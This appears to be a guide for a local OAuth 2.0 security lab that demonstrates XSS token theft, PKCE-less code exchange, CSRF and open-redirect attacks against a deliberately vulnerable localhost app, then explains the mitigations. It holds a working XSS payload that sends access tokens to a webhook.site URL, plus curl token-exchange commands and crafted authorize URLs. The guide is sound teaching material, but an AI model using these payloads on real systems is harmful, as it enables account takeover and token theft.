# OAuth 2.0 Security Demo Guide

## Section 1: Setup

### Prerequisites
- Node.js installed
- 4 terminal windows

### Server Setup

Run all the setup server by this command:


```bash
chmod +x start-all-servers.sh
./start-all-servers
```



### Test Credentials
- Username: `demo`
- Password: `password123`

## Section 2: Attack Demonstrations 

Open: `http://localhost:8000/attack-demo.html`


### Attack 1: XSS Token Theft via Unsanitized Input

**Scenario:** Vulnerable client has a message board that doesn't sanitize user input, allowing XSS attacks to exfiltrate tokens

**Steps:**

1. Set up webhook to capture stolen token:
   - Go to https://webhook.site
   - Copy your unique webhook URL (e.g., `https://webhook.site/your-unique-id`)

2. Login to vulnerable client at `http://localhost:3000`
   - Username: `demo`
   - Password: `password123`

3. After login, find the "🚨 XSS VULNERABILITY: Unsanitized User Input" section with the Message Board

4. Inject XSS payload into the message box (replace YOUR_WEBHOOK_URL with your webhook URL):
```html
<img src=x onerror="fetch('https://webhook.site/YOUR_WEBHOOK_URL?token='+localStorage.getItem('access_token'))">
```

5. Click "Post Message" - the XSS executes silently and sends the token to your webhook!

6. Check your webhook.site dashboard - you'll see the stolen access token in the request parameters

7. Use the stolen token to access victim's data:
```bash
curl -X GET http://localhost:4000/userinfo -H "Authorization: Bearer YOUR_STOLEN_TOKEN_HERE"
```

**Result:** Complete silent token exfiltration through XSS - victim sees nothing suspicious!

**Why this works:**
- Message board uses `innerHTML` without sanitization
- Access tokens stored in localStorage (accessible to JavaScript)
- No Content Security Policy (CSP)
- XSS payload executes with full page privileges
- `fetch()` silently sends token to attacker's server

**Alternative for testing (shows alert instead):**
```html
<img src=x onerror="alert(localStorage.getItem('access_token'))">
```

**Alternative:** Use interactive demo at `http://localhost:8000/attack-demo.html` (Attack 1 section)


### Attack 2: Authorization Code Interception & Exploitation
1. Complete login flow at `http://localhost:3000`
2. After OAuth login, authorization code appears in the URL like this:
   `http://localhost:3000/callback?code=XXXXX`
3. Copy the authorization code, then exchange it for access token using curl:

```bash
curl -X POST http://localhost:4000/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code&code=YOUR_CODE_HERE&redirect_uri=http://localhost:3000/callback&client_id=client-app-vulnerable"
```

4. **Result:** Server returns access token WITHOUT requiring code_verifier (No PKCE protection)
**Alternative:** Use the interactive demo at `http://localhost:8000/attack-demo.html` (Attack 2 section) 




### Attack 3: CSRF Attack 

**Scenario:** Attacker tricks victim into authorizing attacker's OAuth flow

**Steps:**

1. Attacker generates malicious OAuth URL (without state parameter):
```
http://localhost:4000/authorize?response_type=code&client_id=client-app-vulnerable&redirect_uri=http://localhost:3000/callback&scope=profile+email
```

2. Attacker sends this URL to victim (via email/chat/phishing)

3. Victim clicks the link and authorizes:
   - Opens link in browser
   - Login with: `demo / password123`
   - Clicks "Allow"
   - Gets redirected to: `http://localhost:3000/callback?code=XXXXX`

4. Attacker gets the authorization code (via Referer header, image tracking, network sniffing, etc.)

5. Attacker exchanges code for token using curl:
```bash
curl -X POST http://localhost:4000/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code&code=VICTIM_CODE_HERE&redirect_uri=http://localhost:3000/callback&client_id=client-app-vulnerable"
```

6. **Result:** Server returns access token WITHOUT validating who initiated the OAuth flow

**Alternative:** Use interactive demo at `http://localhost:8000/csrf-attack-demo.html`



### Attack 4: Open Redirect

**Scenario:** Attacker exploits missing redirect_uri validation to steal authorization codes

**Steps:**

1. Set up a webhook to capture the redirect (use webhook.site or similar):
   - Go to https://webhook.site
   - Copy your unique webhook URL ( `https://webhook.site/your-unique-id`)

2. Attacker crafts malicious OAuth URL with webhook as redirect_uri:
```
http://localhost:4000/authorize?response_type=code&client_id=client-app-vulnerable&redirect_uri=https://webhook.site/your-unique-id&scope=profile+email
```

3. Victim clicks the link and authorizes:
   - Opens link in browser
   - Login with: `demo / password123`
   - Clicks "Allow"

4. Check your webhook.site dashboard:
   - Authorization code appears in the webhook request
   - URL will be: `https://webhook.site/your-unique-id?code=XXXXX`

5. Attacker exchanges the captured code for access token:
```bash
curl -X POST http://localhost:4000/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code&code=CAPTURED_CODE_HERE&redirect_uri=https://webhook.site/your-unique-id&client_id=client-app-vulnerable"
```

6. **Result:** Server accepts arbitrary redirect_uri and sends authorization code to attacker's webhook




---

## Section 3: Secure Implementation

Open: `http://localhost:8000/secure-attack-demo.html`

### Test 1: XSS Protection
1. Click "Open Secure Client" → Login
2. Open DevTools → Run: `localStorage.getItem('access_token')`
3. **Result:** `null` - Tokens stored server-side with HttpOnly cookies

### Test 2: Code Exposure Prevention
1. Click "Check for Code Exposure"
2. **Result:** No code in URL - Processed server-side immediately

### Test 3: CSRF Protection
1. Click "Attempt CSRF Attack"
2. **Result:** Server rejects - `state parameter is required` (minimum 32 chars)

### Test 4: Open Redirect Prevention
1. Enter: `http://evil-attacker.com/steal`
2. Click "Attempt Open Redirect"
3. **Result:** Server rejects - `Invalid redirect_uri` (strict whitelist)

### Test 5: PKCE Enforcement
1. Get authorization code
2. Click "Attempt Code Exchange Without PKCE"
3. **Result:** Server rejects - `code_verifier is required` (PKCE verification failed)

### Test 6: Token Protection
1. Click "Attempt to Access Token"
2. **Result:** No tokens in localStorage, sessionStorage, or cookies (stored server-side only)


## Key Security Differences

**Vulnerable Implementation:**
- Tokens in localStorage (JavaScript accessible)
- No PKCE protection
- No state parameter validation
- No redirect_uri whitelist
- Client-side token exchange
- Codes visible in browser

**Secure Implementation:**
- Server-side sessions (HttpOnly cookies)
- PKCE with S256 enforced
- State parameter required (32+ chars)
- Strict redirect_uri whitelist
- Server-side token exchange
- Codes processed immediately, never exposed

---

## Section 4: Security Enhancements Explained

### 1. PKCE (Proof Key for Code Exchange)

**Mitigation:** The client generates a cryptographically random `code_verifier` (43-128 characters) and computes its SHA256 hash as the `code_challenge`. During authorization, the challenge is sent to the server and bound to the authorization code. When exchanging the code for a token, the client must provide the original verifier, which the server validates by hashing and comparing with the stored challenge.

**Security benefit:** This prevents authorization code interception attacks. Even if an attacker intercepts the code through MITM, network sniffing, or malware, they cannot exchange it without the original verifier that was kept secret on the client. This is essential for public clients like mobile apps and SPAs where client secrets cannot be securely stored.

### 2. State Parameter

**Mitigation:** The client generates a cryptographically random state value (minimum 32 characters) and stores it server-side in the session before redirecting to authorization. When the authorization server redirects back, the client validates that the received state matches the stored value.

**Security benefit:** This prevents Cross-Site Request Forgery (CSRF) attacks by binding the authorization request to the user's session. Attackers cannot forge valid authorization requests because they don't know the randomly generated state value. This also detects replay attacks and ensures the callback originated from a legitimate authorization flow initiated by the user.

### 3. HttpOnly Cookies + Server-Side Sessions

**Mitigation:** Access tokens are stored in server-side sessions rather than browser storage. The session is identified by a session ID stored in an HttpOnly cookie with SameSite=lax attribute. The Secure flag is set for HTTPS environments, and tokens are never transmitted to the browser or accessible via JavaScript.

**Security benefit:** This completely prevents XSS token theft. Since JavaScript cannot access HttpOnly cookies, malicious scripts injected through XSS vulnerabilities cannot steal tokens. Browser extensions and client-side attacks have no access to credentials. The token remains on the server and is only used for backend API calls on behalf of the user.

### 4. Redirect URI Whitelist

**Mitigation:** The authorization server maintains an exact whitelist of allowed redirect URIs for each registered client. Both the authorization and token endpoints perform strict validation requiring exact matches with no wildcards or partial matching allowed. Any redirect_uri not in the whitelist is immediately rejected.

**Security benefit:** This prevents open redirect vulnerabilities that could send authorization codes to attacker-controlled domains. Without this control, attackers can craft malicious authorization URLs that redirect victims to phishing sites while appearing legitimate. The whitelist ensures codes only go to verified application endpoints, blocking unauthorized applications and phishing attacks.

### 5. Server-Side Token Exchange

**Mitigation:** The token exchange process occurs entirely on the backend server. When the authorization callback is received, the server immediately exchanges the code for an access token using a server-to-server request. The authorization code never reaches the browser, and after exchange, the user is redirected to a clean URL without any sensitive parameters.

**Security benefit:** This prevents code exposure through browser history, server logs, screenshots, and network traffic analysis. Authorization codes are processed within milliseconds and never appear in client-side JavaScript. The reduced attack surface means fewer opportunities for credential leakage, and eavesdroppers monitoring client traffic cannot capture usable codes.

### 6. Single-Use Authorization Codes

**Mitigation:** The server tracks each authorization code's usage status and marks it as used after successful token exchange. Any attempt to reuse a code is rejected, and the code is immediately deleted from storage. Codes also have time-based expiration of 10 minutes from issuance.

**Security benefit:** This prevents code replay attacks and serves as a breach detection mechanism. If a code is reused, it indicates a potential security compromise (either the code was stolen or the client is behaving maliciously). The single-use constraint limits damage from code leakage since stolen codes become worthless after the legitimate client uses them.

### 7. Token Expiration

**Mitigation:** Authorization codes expire after 10 minutes and access tokens expire after 1 hour. The server validates expiration timestamps on every request and automatically cleans up expired credentials. Users must re-authenticate once tokens expire, and expired tokens are purged from storage.

**Security benefit:** This limits the window of opportunity for attackers. Stolen tokens become useless after expiration, reducing the impact of credential theft. Long-lived tokens pose greater risk since attackers have more time to exploit them. Forced periodic re-authentication ensures compromised accounts can be recovered by changing passwords, and automatic cleanup prevents storage bloat.

### 8. Secure Logging

**Mitigation:** The logging system is configured to never record authorization codes, access tokens, code verifiers, code challenges, or passwords. Only usernames, client IDs, timestamps, and non-sensitive metadata are logged. All sensitive parameters are redacted or omitted from log output.

**Security benefit:** This prevents credential leakage through log files. Developers can safely share logs for debugging without exposing user credentials. The risk of insider threats is reduced since even privileged users with log access cannot extract usable tokens. This practice complies with security standards and data protection regulations requiring protection of sensitive information.

